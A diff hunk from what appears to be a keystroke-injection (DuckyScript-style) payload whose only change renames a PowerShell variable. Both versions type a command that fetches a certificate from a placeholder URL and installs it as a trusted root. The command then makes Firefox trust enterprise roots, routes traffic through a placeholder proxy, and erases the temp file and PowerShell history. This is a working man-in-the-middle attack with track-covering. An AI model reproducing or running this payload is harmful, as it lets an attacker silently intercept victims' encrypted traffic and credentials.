@@ -29,13 +29,13 @@ DELAY SHORT
 STRING i
 
 DELAY MEDIUM
-STRING Clear-Host; $a = New-TemporaryFile; try { Invoke-WebRequest -Uri "
+STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -Uri "
 STRING CERT_URL
-STRING " -OutFile $a; Import-Certificate -FilePath $a -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
+STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
 STRING PROXY_IP
 STRING :
 STRING PROXY_PORT
-STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $a; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
+STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $c; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
 
 DELAY SHORT
 ENTER
